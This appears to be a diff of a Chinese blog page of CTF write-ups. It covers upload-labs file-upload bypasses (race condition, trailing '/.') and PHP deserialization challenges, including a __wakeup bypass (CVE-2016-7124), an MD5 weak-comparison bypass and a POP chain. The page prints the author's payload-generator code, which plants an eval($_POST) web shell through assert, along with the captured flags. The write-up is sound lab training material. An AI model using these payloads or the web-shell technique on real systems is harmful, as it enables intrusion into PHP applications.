+<p>将上传上去的图片码与渲染后的图片进行比较，下载了一个二进制比较器 Fairdell HexCmp，找到不变的地方，就可以插入一句话木马了</p>
+<h2 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h2><p>原理： 条件竞争方法（<strong>即在文件被删除之前访问该文件</strong>）绕过，需要不停且迅速的上传，访问文件</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/340e85ca-image.png" alt="image.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);//图片文件白名单</span><br><span class="line">    $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];//提取文件后缀名</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;//判断是否合法，不合法删掉</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/1d5812d6-image.png)
-
-burp在上传时抓个包后ctrl+i 发送至Intruder，
-
-在下图再抓给包，用来知道上传文件存放路径![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/7f6762db-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/56797e46-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/a66c989b-image.png)
-
-修改为上图模样，将两个包同时开始
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/48e39bdf-image.png)
-
-不断访问上传
-
-找到第二个抓的包的页面，request,点击respose里的render即可查看这个服务器版本
-
-## pass-19
-
-和18题的操作没有什么区别
-
-## pass-20
-
-没有对上传的文件做判断，只对用户输入的文件名做判断
-后缀名黑名单
-上传的文件名用户可控
-黑名单用于用户输入的文件后缀名进行判断
-move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的 /.
-
-上传文件burp抓包
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/83010526-image.png)
-
-修改为上图的样子
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/cfa610e8-image.png)
-
-成功
-
-## 序列化和反序列化
-
-## 1
-
-逐行分析代码逻辑
-
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/1d5812d6-image.png" alt="image.png"></p>
+<p>burp在上传时抓个包后ctrl+i 发送至Intruder，</p>
+<p>在下图再抓给包，用来知道上传文件存放路径<img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/7f6762db-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/56797e46-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/a66c989b-image.png" alt="image.png"></p>
+<p>修改为上图模样，将两个包同时开始</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/48e39bdf-image.png" alt="image.png"></p>
+<p>不断访问上传</p>
+<p>找到第二个抓的包的页面，request,点击respose里的render即可查看这个服务器版本</p>
+<h2 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h2><p>和18题的操作没有什么区别</p>
+<h2 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h2><p>没有对上传的文件做判断，只对用户输入的文件名做判断<br>后缀名黑名单<br>上传的文件名用户可控<br>黑名单用于用户输入的文件后缀名进行判断<br>move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的 &#x2F;.</p>
+<p>上传文件burp抓包</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/83010526-image.png" alt="image.png"></p>
+<p>修改为上图的样子</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/cfa610e8-image.png" alt="image.png"></p>
+<p>成功</p>
+<h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><h2 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h2><p>逐行分析代码逻辑</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">* find flag by yourself</span><br><span class="line">*/</span><br><span class="line">error_reporting(0);//</span><br><span class="line">class dxg</span><br><span class="line">&#123;</span><br><span class="line">function fmm()</span><br><span class="line">&#123;</span><br><span class="line">return &quot;nonono&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class lt</span><br><span class="line">&#123;</span><br><span class="line">public $impo=&#x27;hi&#x27;;</span><br><span class="line">public $md51=&#x27;weclome&#x27;;</span><br><span class="line">public $md52=&#x27;to HnuSec&#x27;;</span><br><span class="line">function __construct()//对象被创建时触发,dxg实例化</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;impo = new dxg;</span><br><span class="line">&#125;</span><br><span class="line">function __wakeup()//反序列化时触发,实例化dxg同时调用dxg的fmm方法并返回结果</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;impo = new dxg;</span><br><span class="line">return $this-&gt;impo-&gt;fmm();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __toString()//对象被当作字符串调用的时候触发</span><br><span class="line">&#123;</span><br><span class="line">if (isset($this-&gt;impo) &amp;&amp; md5($this-&gt;md51) == md5($this-&gt;md52) &amp;&amp; $this-&gt;md51 != $this-&gt;md52)</span><br><span class="line">return $this-&gt;impo-&gt;fmm();</span><br><span class="line">&#125;</span><br><span class="line">function __destruct()//析构函数</span><br><span class="line">&#123;</span><br><span class="line">echo $this;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class fin</span><br><span class="line">&#123;</span><br><span class="line">public $a;</span><br><span class="line">public $url = &#x27;https://www.HnuSec.com&#x27;;</span><br><span class="line">public $title;</span><br><span class="line">function fmm()</span><br><span class="line">&#123;</span><br><span class="line">$b = $this-&gt;a;</span><br><span class="line">$b($this-&gt;title);//突破口,从这植入一句话木马</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;Hnu&#x27;])) &#123;</span><br><span class="line">$Data = unserialize($_GET[&#x27;Hnu&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-理一下逻辑,这段代码中有两个fmm功能,很明显我们不需要dxg这个类里面的fmm功能,而是需要class fin里面的
-
-首先实例化class 1t-->再调用里面的impo对象-->,让impo对象去调用fin类里面的fmm功能
-
-然后还涉及两个绕过,CVE-2016-7124漏洞,也就是__wakeup的绕过(漏洞影响的版本 PHP5 < 5.6.25 PHP7 < 7.0.10 只要把对象成员改大，就可以绕过__wakeup )
-
-另一个__ToString是MD5弱等于绕过,前面笔记有写.
-
+<p>理一下逻辑,这段代码中有两个fmm功能,很明显我们不需要dxg这个类里面的fmm功能,而是需要class fin里面的</p>
+<p>首先实例化class 1t–&gt;再调用里面的impo对象–&gt;,让impo对象去调用fin类里面的fmm功能</p>
+<p>然后还涉及两个绕过,CVE-2016-7124漏洞,也就是__wakeup的绕过(漏洞影响的版本 PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 只要把对象成员改大，就可以绕过__wakeup )</p>
+<p>另一个__ToString是MD5弱等于绕过,前面笔记有写.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lt</span><br><span class="line">&#123;</span><br><span class="line">   public $impo=&#x27;hi&#x27;;</span><br><span class="line">   public $md51=&#x27;weclome&#x27;;</span><br><span class="line">   public $md52=&#x27;to HnuSec&#x27;;</span><br><span class="line">   function __construct()</span><br><span class="line">   &#123;</span><br><span class="line">      $this-&gt;impo = new fin;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">   function __destruct()</span><br><span class="line">   &#123;</span><br><span class="line">      echo $this;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class fin</span><br><span class="line">&#123;</span><br><span class="line">   public $a;</span><br><span class="line">   public $url = &#x27;https://www.HnuSec.com&#x27;;</span><br><span class="line">   public $title;</span><br><span class="line">   function fmm()</span><br><span class="line">   &#123;</span><br><span class="line">      $b = $this-&gt;a;</span><br><span class="line">      $b($this-&gt;title);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new lt();//实例化lt(注意不是I,肯定有小可爱在这嘎,我没有^_^)</span><br><span class="line">$a-&gt;md51=&quot;240610708&quot;;//写完了才意识到可以直接在上面篡改数据QAQ</span><br><span class="line">$a-&gt;md52=&quot;QNKCDZO&quot;;</span><br><span class="line">$a-&gt;impo-&gt;title=&quot;eval(\$_POST[1])&quot;;</span><br><span class="line">//植入木马,在这嘎了,双引号里面变量会被识别,所以需要加转义字符(咨询了杨师傅)</span><br><span class="line">$a-&gt;impo-&gt;a=&quot;assert&quot;;//这里涉及到一个知识点,php断言,也就是assert函数(网上搜题)</span><br><span class="line">$add=serialize($a);</span><br><span class="line">$add1 = preg_replace(&quot;/:3:&#123;s:4:/&quot;,&quot;:4:&#123;s:4:&quot;,$add);</span><br><span class="line">//preg_replace:进行匹配,然后替换,(搜到的)</span><br><span class="line">echo urlencode($add1);//使用url编码,防止有%00被漏掉</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-***php断言***
-
-- 语法:assert ( mixed $assertion [, Throwable $exception ] ) : bool
-- 参数 assertion 既支持表达式，也支持表达式字符串(某些特定的场景会用到，比如判断某个字符串表达式是否合法)
-- 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式
-
-蚁剑上号,找到flag
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/f754ca9f-image.png)
-
-`flag{b0baee9d-279d-34fa-1dfd-71aadb908c3f}`
-
-## 2
-
-URL:[http://114.116.119.253:8002/index.php](http://114.116.119.253:8002/index.php)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/e0ab58e3-image.png)
-
-根据给的提示,需要进行扫描,一开始以为是burp suite的scan(给定地址，爬取内容，检测漏洞)扫描,搜了一下,发现不是
-
-然后,自己去下了御剑,貌似还是一个emo博主的珍藏![0LVJ8SZ7HRG%Z6RRS7SOVRD.png](/yuque-notes/03-CTF Challenge's Writeup/assets/fb21020e-0LVJ8SZ7HRG%Z6RRS7SOVRD.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/b21d2dac-image.png)
-
-因为第一个刷出来的是www.zip文件,所以我就直接点进去下载,看到了题目
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/8a059861-image.png)
-
-两个php源文件,
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/8e509a4e-image.png)
-
-嗯,标准的反序列化,篡改数据的题需要我们在index.php的界面,也就是一开始的界面输入
-
+<p><em><strong>php断言</strong></em></p>
+<ul>
+<li>语法:assert ( mixed $assertion [, Throwable $exception ] ) : bool</li>
+<li>参数 assertion 既支持表达式，也支持表达式字符串(某些特定的场景会用到，比如判断某个字符串表达式是否合法)</li>
+<li>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式</li>
+</ul>
+<p>蚁剑上号,找到flag</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/f754ca9f-image.png" alt="image.png"></p>
+<p><code>flag{b0baee9d-279d-34fa-1dfd-71aadb908c3f}</code></p>
+<h2 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h2><p>URL:<a target="_blank" rel="noopener" href="http://114.116.119.253:8002/index.php">http://114.116.119.253:8002/index.php</a></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/e0ab58e3-image.png" alt="image.png"></p>
+<p>根据给的提示,需要进行扫描,一开始以为是burp suite的scan(给定地址，爬取内容，检测漏洞)扫描,搜了一下,发现不是</p>
+<p>然后,自己去下了御剑,貌似还是一个emo博主的珍藏<img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/fb21020e.png" alt="0LVJ8SZ7HRG%Z6RRS7SOVRD.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/b21d2dac-image.png" alt="image.png"></p>
+<p>因为第一个刷出来的是<a target="_blank" rel="noopener" href="http://www.zip文件,所以我就直接点进去下载,看到了题目/">www.zip文件,所以我就直接点进去下载,看到了题目</a></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/8a059861-image.png" alt="image.png"></p>
+<p>两个php源文件,</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/8e509a4e-image.png" alt="image.png"></p>
+<p>嗯,标准的反序列化,篡改数据的题需要我们在index.php的界面,也就是一开始的界面输入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;; //私有化属性2个</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password; </span><br><span class="line">        //构造函数，要传2个参数，这里不会触发的</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;; </span><br><span class="line">        //反序列化时触发，让username=guest</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;  //析构函数</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            //如果上面wakeup触发就不会满足</span><br><span class="line">            global $flag;//flag变成超全局变量</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-理一下逻辑
-
-**password=100,name=admin-->绕过__wakeup-->echo $flag**
-
-在class.php代码里添加如下代码(懒得再copy一大段了)
-
+<p>理一下逻辑</p>
+<p><strong>password&#x3D;100,name&#x3D;admin–&gt;绕过__wakeup–&gt;echo $flag</strong></p>
+<p>在class.php代码里添加如下代码(懒得再copy一大段了)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=new Name(&#x27;admin&#x27;,&#x27;100&#x27;);</span><br><span class="line">$a1= serialize($a);</span><br><span class="line">echo &quot;$a1&quot;;</span><br><span class="line">echo urlencode($a1);//防止%00被漏掉</span><br></pre></td></tr></table></figure>
 
-然后在输出的url编码结果中将**对象成员数改大**,用get方法输入,得到flag.
-
-`HnuSec{3691308f-2a4c-2f69-83f2-880d32e29c84} `
-
-## 3pop链
-
-首先去查了一下什么是pop
-
-POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据,感觉就是比之前的题长一点?复杂一点?
-
-首先检查网页,f12看到提示
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/6328addc-image.png)
-
-跳转到InDeX.php界面,得到如下代码,分析如下
-
+<p>然后在输出的url编码结果中将<strong>对象成员数改大</strong>,用get方法输入,得到flag.</p>
+<p><code>HnuSec{3691308f-2a4c-2f69-83f2-880d32e29c84} </code></p>
+<h2 id="3pop链"><a href="#3pop链" class="headerlink" title="3pop链"></a>3pop链</h2><p>首先去查了一下什么是pop</p>
+<p>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据,感觉就是比之前的题长一点?复杂一点?</p>
+<p>首先检查网页,f12看到提示</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/6328addc-image.png" alt="image.png"></p>
+<p>跳转到InDeX.php界面,得到如下代码,分析如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type: text/html; charset=utf-8&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class Air&#123;</span><br><span class="line">    private $name=&quot;Air is the best Hacker&quot;;</span><br><span class="line">    protected $title=&quot;sword&quot;;</span><br><span class="line">    public function OneSecondHack()&#123;</span><br><span class="line">        echo &quot;you had been hacked by air!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($name)&#123;</span><br><span class="line">       echo $this-&gt;title;//这里,对象被当作字符串调用,触发__tostring</span><br><span class="line">       return $name;</span><br><span class="line">    &#125;//当访问一个私有属性,不存在属性时触发</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $test=$this-&gt;name;</span><br><span class="line">        $test();//(感觉这里是突破口,植入一句话木马)好吧我想错了,这里是对象被当作方法,触发__invoke</span><br><span class="line">        return &#x27;&#x27;;</span><br><span class="line">    &#125;//在对象被当成字符串调用的时候触发</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        include $this-&gt;name;</span><br><span class="line">    &#125;//当一个对象被当成方法调用的时候触发</span><br><span class="line">&#125;</span><br><span class="line">class Boogipop&#123;</span><br><span class="line">   public $name=&quot;Air&#x27;s fans&quot;;</span><br><span class="line">   public $title=&quot;vegetable&quot;;</span><br><span class="line">   public function admire()&#123;</span><br><span class="line">       echo &quot;给air佬递茶&quot;;</span><br><span class="line">       echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   public function whoiam()&#123;</span><br><span class="line">       echo &#x27;airs fans&#x27;;</span><br><span class="line">       echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">       return $this-&gt;name-&gt;name;//这里应该是要序列化,然后调用air里面的name</span><br><span class="line">   &#125;这会触发__get,第二个是私有属性</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Vegetable&#123;</span><br><span class="line">    public $important;</span><br><span class="line">        public function __construct()//在类被初始化的时候触发,当对象被创建时</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;important=new Boogipop();</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()//在整个php代码运行完的时候</span><br><span class="line">        &#123;</span><br><span class="line">           $this-&gt;important-&gt;whoiam();</span><br><span class="line">        &#125;//从这去调用上面的whoiam功能</span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">            $this-&gt;important=new Boogipop();</span><br><span class="line">        &#125;//反序列化时触发,一般需要绕过</span><br><span class="line">&#125;</span><br><span class="line">$Air=new Air();</span><br><span class="line">$Air-&gt;OneSecondHack();</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$Boogipop=new Boogipop();</span><br><span class="line">$Boogipop-&gt;admire();</span><br><span class="line">if(isset($_POST[&#x27;pop&#x27;]) and $_COOKIE[&#x27;admin&#x27;]==1)&#123;</span><br><span class="line">    unserialize($_POST[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-梳理逻辑
-
-__destruct()调用whoiam功能-->私有属性被访问-->__get被调用-->对象被当作字符串-->__ToString被调用-->对象被当做方法-->__invoke被调用-->include植入木马
-
+<p>梳理逻辑</p>
+<p>__destruct()调用whoiam功能–&gt;私有属性被访问–&gt;__get被调用–&gt;对象被当作字符串–&gt;__ToString被调用–&gt;对象被当做方法–&gt;__invoke被调用–&gt;include植入木马</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Air</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>=<span class="string">&quot;falg.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$title</span>=<span class="string">&quot;sword&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">OneSecondHack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you had been hacked by air!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;<span class="comment">//当访问一个私有属性,不存在属性时触发</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;title;<span class="comment">//触发tostring</span></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)//在对象被当成字符串调用的时候触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$test</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span 